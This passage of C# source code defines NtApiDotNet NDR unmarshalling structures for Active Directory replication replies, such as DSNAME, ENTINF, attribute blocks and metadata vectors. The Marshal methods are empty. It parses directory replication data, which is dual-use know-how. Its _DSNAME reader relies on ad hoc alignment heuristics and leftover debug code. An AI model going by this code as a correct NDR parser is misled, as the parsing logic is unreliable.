            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {
                
            }

            private void Unmarshal(_Unmarshal_Helper u)
            {
                ndx = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                prefix = u.Read_OID_t();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int ndx;
            public _OID_t prefix;
            public static _PrefixTableEntry CreateDefault()
            {
                return new _PrefixTableEntry();
            }
            public _PrefixTableEntry(int ndx, _OID_t prefix)
            {
                this.ndx = ndx;
                this.prefix = prefix;
            }
        }
        
        public struct _OID_t : NtApiDotNet.Ndr.Marshal.INdrStructure
        {

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                // x64 alignment
                u.Align(4, this);


                length = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                elements = u.ReadEmbeddedPointer<byte[]>(new System.Func<byte[]>(u.Read_ByteArray), false);

                u.Align(4, this);

            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int length;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<byte[]> elements;
            public static _OID_t CreateDefault()
            {
                return new _OID_t();
            }
            public _OID_t(int length, byte[] elements)
            {
                this.length = length;
                this.elements = elements;
            }
        }
        
        public struct _DSNAME : NtApiDotNet.Ndr.Marshal.INdrConformantStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {

                // x86 pointers default
                if (!u.is64bit)
                {
                    structLen = u.ReadInt32();
                    SidLen = u.ReadInt32();
                    Guid = u.ReadGuid();
                    Sid = u.Read_NT4SID();
                    NameLen = u.ReadInt32();
                    StringName = u.Read_CharArray();

                    return;
                }

                //u.Align(256, this);

                // Read the first bytes from the stack
                // The first non-0 byte will be the length of the char array which would normally be used
                // to calculate the char array in the bytestream
                byte[] initBytes = new byte[4];
                bool gotByte = false;
                while (!gotByte)
                {
                    //initBytes = u.Align(4, this);
                    initBytes = u.ReadFixedByteArray(4);
                    if (initBytes.Any(x => x != 0))
                        gotByte = true;
                }

                int charLength = BitConverter.ToInt32(initBytes);

                // we need to align again
                u.Align(4, this);

                // We should now be able to read the data
                structLen = u.ReadInt32();

                // There's a slight chance that alignment issues occur with greater packets
                // If charlength is grater than structsize, try to reorder things
                if (structLen < charLength)
                {
                    int tmp1, tmp2, tmp3;
                    tmp1 = structLen;
                    tmp2 = charLength;

                    u.Align(64, this);

                    SidLen = structLen;
                    structLen = charLength;

                }
                else
                {
                    SidLen = u.ReadInt32();
                }

                Guid = u.ReadGuid();
                Sid = u.Read_NT4SID();
                NameLen = u.ReadInt32();

                StringName = u.ReadFixedCharArray(NameLen + 1);

                // Make sure to reset conformance values
                u.ClearConformanceValues();

                // Align for x64
                var t1 = structLen % 8;
                if (t1 > 0)
                {
                    int iAlign = 8 - t1;
                    u.Align(iAlign, this);
                }
            }
            int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()
            {
                return 1;
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int structLen;
            public int SidLen;
            public System.Guid Guid;
            public _NT4SID Sid;
            public int NameLen;
            public char[] StringName;
            public static _DSNAME CreateDefault()
            {
                _DSNAME ret = new _DSNAME();
                ret.StringName = new char[0];
                return ret;
            }
            public _DSNAME(int structLen, int SidLen, System.Guid Guid, _NT4SID Sid, int NameLen, char[] StringName)
            {
                this.structLen = structLen;
                this.SidLen = SidLen;
                this.Guid = Guid;
                this.Sid = Sid;
                this.NameLen = NameLen;
                this.StringName = StringName;
            }
        }
        
        public struct _NT4SID : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                Data = u.Read_NT4SID_Data();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 1;
            }
            public sbyte[] Data;
            public static _NT4SID CreateDefault()
            {
                _NT4SID ret = new _NT4SID();
                ret.Data = new sbyte[28];
                return ret;
            }
            public _NT4SID(sbyte[] Data)
            {
                this.Data = Data;
            }
        }
        
        public struct _UPTODATE_VECTOR_V2_EXT : NtApiDotNet.Ndr.Marshal.INdrConformantStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                dwVersion = u.ReadInt32();
                dwReserved1 = u.ReadInt32();
                cNumCursors = u.ReadInt32();
                dwReserved2 = u.ReadInt32();

                rgCursors = u.Read_UPTODATE_CURSOR_V2();
            }
            int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()
            {
                return 1;
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public int dwVersion;
            public int dwReserved1;
            public int cNumCursors;
            public int dwReserved2;
            public _UPTODATE_CURSOR_V2[] rgCursors;
            public static _UPTODATE_VECTOR_V2_EXT CreateDefault()
            {
                _UPTODATE_VECTOR_V2_EXT ret = new _UPTODATE_VECTOR_V2_EXT();
                ret.rgCursors = new _UPTODATE_CURSOR_V2[0];
                return ret;
            }
            public _UPTODATE_VECTOR_V2_EXT(int dwVersion, int dwReserved1, int cNumCursors, int dwReserved2, _UPTODATE_CURSOR_V2[] rgCursors)
            {
                this.dwVersion = dwVersion;
                this.dwReserved1 = dwReserved1;
                this.cNumCursors = cNumCursors;
                this.dwReserved2 = dwReserved2;
                this.rgCursors = rgCursors;
            }
        }
        
        public struct _UPTODATE_CURSOR_V2 : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                uuidDsa = u.ReadGuid();
                usnHighPropUpdate = u.ReadInt64();
                timeLastSyncSuccess = u.ReadInt64();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public System.Guid uuidDsa;
            public long usnHighPropUpdate;
            public long timeLastSyncSuccess;
            public static _UPTODATE_CURSOR_V2 CreateDefault()
            {
                return new _UPTODATE_CURSOR_V2();
            }
            public _UPTODATE_CURSOR_V2(System.Guid uuidDsa, long usnHighPropUpdate, long timeLastSyncSuccess)
            {
                this.uuidDsa = uuidDsa;
                this.usnHighPropUpdate = usnHighPropUpdate;
                this.timeLastSyncSuccess = timeLastSyncSuccess;
            }
        }
        
        public struct REPLENTINFLIST : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                // Fix x64 alignment
                u.Align(4, this);


                pNextEntInf = u.ReadEmbeddedPointer<REPLENTINFLIST>(new System.Func<REPLENTINFLIST>(u.Read_REPLENTINFLIST), false);

                // TODO: Remove
                //u.Align(256, this);

                // Fix x64 alignment
                u.Align(4, this);

                Entinf = u.Read_ENTINF();

                // Fix x64 alignment
                u.Align(4, this);

                fIsNCPrefix = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                pParentGuid = u.ReadEmbeddedPointer<System.Guid>(new System.Func<System.Guid>(u.ReadGuid), false);

                // Fix x64 alignment
                u.Align(4, this);

                pMetaDataExt = u.ReadEmbeddedPointer<_PROPERTY_META_DATA_EXT_VECTOR>(new System.Func<_PROPERTY_META_DATA_EXT_VECTOR>(u.Read_PROPERTY_META_DATA_EXT_VECTOR), false);
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<REPLENTINFLIST> pNextEntInf;
            public _ENTINF Entinf;
            public int fIsNCPrefix;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<System.Guid> pParentGuid;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_PROPERTY_META_DATA_EXT_VECTOR> pMetaDataExt;
            public static REPLENTINFLIST CreateDefault()
            {
                return new REPLENTINFLIST();
            }
            public REPLENTINFLIST(System.Nullable<REPLENTINFLIST> pNextEntInf, _ENTINF Entinf, int fIsNCPrefix, System.Nullable<System.Guid> pParentGuid, System.Nullable<_PROPERTY_META_DATA_EXT_VECTOR> pMetaDataExt)
            {
                this.pNextEntInf = pNextEntInf;
                this.Entinf = Entinf;
                this.fIsNCPrefix = fIsNCPrefix;
                this.pParentGuid = pParentGuid;
                this.pMetaDataExt = pMetaDataExt;
            }
        }
        
        public struct _ENTINF : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                pName = u.ReadEmbeddedPointer<_DSNAME>(new System.Func<_DSNAME>(u.Read_DSNAME), false);

                // Fix x64 alignment
                u.Align(4, this);

                ulFlags = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                AttrBlock = u.Read_ATTRBLOCK();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_DSNAME> pName;
            public int ulFlags;
            public _ATTRBLOCK AttrBlock;
            public static _ENTINF CreateDefault()
            {
                return new _ENTINF();
            }
            public _ENTINF(System.Nullable<_DSNAME> pName, int ulFlags, _ATTRBLOCK AttrBlock)
            {
                this.pName = pName;
                this.ulFlags = ulFlags;
                this.AttrBlock = AttrBlock;
            }
        }
        
        public struct _ATTRBLOCK : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                u.Align(4, this);

                attrCount = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                pAttr = u.ReadEmbeddedPointer<_ATTR[]>(new System.Func<_ATTR[]>(u.Read_ATTRArray), false);
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int attrCount;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_ATTR[]> pAttr;
            public static _ATTRBLOCK CreateDefault()
            {
                return new _ATTRBLOCK();
            }
            public _ATTRBLOCK(int attrCount, _ATTR[] pAttr)
            {
                this.attrCount = attrCount;
                this.pAttr = pAttr;
            }
        }
        
        public struct _ATTR : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {

                // Fix x64 alignment
                u.Align(4, this);

                attrTyp = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                AttrVal = u.Read_ATTRVALBLOCK();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int attrTyp;
            public _ATTRVALBLOCK AttrVal;
            public static _ATTR CreateDefault()
            {
                return new _ATTR();
            }
            public _ATTR(int attrTyp, _ATTRVALBLOCK AttrVal)
            {
                this.attrTyp = attrTyp;
                this.AttrVal = AttrVal;
            }
        }
        
        public struct _ATTRVALBLOCK : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                valCount = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                pAVal = u.ReadEmbeddedPointer<_ATTRVAL[]>(new System.Func<_ATTRVAL[]>(u.Read_ATTRValArray), false);


            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int valCount;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_ATTRVAL[]> pAVal;
            public static _ATTRVALBLOCK CreateDefault()
            {
                return new _ATTRVALBLOCK();
            }
            public _ATTRVALBLOCK(int valCount, _ATTRVAL[] pAVal)
            {
                this.valCount = valCount;
                this.pAVal = pAVal;
            }
        }
        
        public struct _ATTRVAL : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                // Fix x64 alignment
                u.Align(4, this);

                valLen = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                pVal = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_ATTRVALPVAL), false);
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int valLen;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> pVal;
            public static _ATTRVAL CreateDefault()
            {
                return new _ATTRVAL();
            }
            public _ATTRVAL(int valLen, sbyte[] pVal)
            {
                this.valLen = valLen;
                this.pVal = pVal;
            }
        }
        
        public struct _PROPERTY_META_DATA_EXT_VECTOR : NtApiDotNet.Ndr.Marshal.INdrConformantStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                // Struct uses 8 byte alignment, which removes
                // the need of manual alignment at the start of this function
                cNumProps = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);


                rgMetaData = u.Read_FG_Metadata();
            }
            int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()
            {
                return 1;
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public int cNumProps;
            public _PROPERTY_META_DATA_EXT[] rgMetaData;
            public static _PROPERTY_META_DATA_EXT_VECTOR CreateDefault()
            {
                _PROPERTY_META_DATA_EXT_VECTOR ret = new _PROPERTY_META_DATA_EXT_VECTOR();
                ret.rgMetaData = new _PROPERTY_META_DATA_EXT[0];
                return ret;
            }
            public _PROPERTY_META_DATA_EXT_VECTOR(int cNumProps, _PROPERTY_META_DATA_EXT[] rgMetaData)
            {
                this.cNumProps = cNumProps;
                this.rgMetaData = rgMetaData;
            }
        }
        
        public struct _PROPERTY_META_DATA_EXT : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                dwVersion = u.ReadInt32();

                timeChanged = u.ReadInt64();
                uuidDsaOriginating = u.ReadGuid();
                usnOriginating = u.ReadInt64();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public int dwVersion;
            public long timeChanged;
            public System.Guid uuidDsaOriginating;
            public long usnOriginating;
            public static _PROPERTY_META_DATA_EXT CreateDefault()
            {
                return new _PROPERTY_META_DATA_EXT();
            }
            public _PROPERTY_META_DATA_EXT(int dwVersion, long timeChanged, System.Guid uuidDsaOriginating, long usnOriginating)
            {
                this.dwVersion = dwVersion;
                this.timeChanged = timeChanged;
                this.uuidDsaOriginating = uuidDsaOriginating;
                this.usnOriginating = usnOriginating;
            }
        }
        
        public struct REPLVALINF_V1 : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                pObject = u.ReadEmbeddedPointer<_DSNAME>(new System.Func<_DSNAME>(u.Read_DSNAME), false);
                attrTyp = u.ReadInt32();
                Aval = u.Read_ATTRVAL();
                fIsPresent = u.ReadInt32();
                MetaData = u.Read_VALUE_META_DATA_EXT_V1();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_DSNAME> pObject;
            public int attrTyp;
            public _ATTRVAL Aval;
            public int fIsPresent;
            public _VALUE_META_DATA_EXT_V1 MetaData;
            public static REPLVALINF_V1 CreateDefault()
            {
                return new REPLVALINF_V1();
            }
            public REPLVALINF_V1(System.Nullable<_DSNAME> pObject, int attrTyp, _ATTRVAL Aval, int fIsPresent, _VALUE_META_DATA_EXT_V1 MetaData)
            {
                this.pObject = pObject;
                this.attrTyp = attrTyp;
                this.Aval = Aval;
                this.fIsPresent = fIsPresent;
                this.MetaData = MetaData;
            }
        }
        
        public struct _VALUE_META_DATA_EXT_V1 : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                timeCreated = u.ReadInt64();
                MetaData = u.Read_PROPERTY_META_DATA_EXT();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public long timeCreated;
            public _PROPERTY_META_DATA_EXT MetaData;
            public static _VALUE_META_DATA_EXT_V1 CreateDefault()
            {
                return new _VALUE_META_DATA_EXT_V1();
            }
            public _VALUE_META_DATA_EXT_V1(long timeCreated, _PROPERTY_META_DATA_EXT MetaData)
            {
                this.timeCreated = timeCreated;
                this.MetaData = MetaData;
            }
        }
        
        public struct DRS_EXTENSIONS : NtApiDotNet.Ndr.Marshal.INdrConformantStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                cb = u.ReadInt32();
                rgb = u.Read_DRS_EXTENSIONS_RGB();
            }
            int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()
            {
                return 1;
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int cb;
            public byte[] rgb;
            public static DRS_EXTENSIONS CreateDefault()
            {
                DRS_EXTENSIONS ret = new DRS_EXTENSIONS();
                ret.rgb = new byte[0];
                return ret;
            }
            public DRS_EXTENSIONS(int cb, byte[] rgb)
            {
                this.cb = cb;
                this.rgb = rgb;
            }
        }

        #endregion
    }
}
